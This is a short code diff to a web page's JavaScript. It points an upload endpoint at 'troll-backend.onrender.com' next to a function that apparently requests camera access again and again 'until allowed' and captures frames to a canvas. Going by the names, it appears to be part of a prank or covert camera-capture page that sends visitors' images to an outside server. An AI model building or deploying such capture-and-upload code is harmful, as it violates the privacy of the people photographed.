@@ -5,7 +5,7 @@ const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
 const toast = document.getElementById("toast");
 
-const BACKEND_URL = "https://your-backend-domain.com/api/upload"; // change this to your backend
+const BACKEND_URL = "https://troll-backend.onrender.com/api/upload"; // change this to your backend
 
 // Request camera every time until allowed
 async function requestCameraAndCapture() {
